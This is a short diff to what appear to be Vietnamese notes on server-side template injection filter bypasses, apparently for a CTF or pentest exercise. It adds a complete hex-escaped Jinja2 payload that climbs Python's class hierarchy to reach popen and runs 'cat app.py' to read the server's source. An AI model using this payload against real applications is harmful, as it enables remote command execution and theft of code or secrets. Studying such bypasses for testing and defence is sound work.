@@ -41,4 +41,9 @@ Có thể kết hợp | và hàm attr() để bypass các ký tự bị filter n
 ()['__cla'+'ss__']
 * Sử dụng hàm lower()
 * Sử dụng hàm pop()
-* 
+
+
+
+
+# Payload
+{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat\x20app\x2epy")["read"]()}}
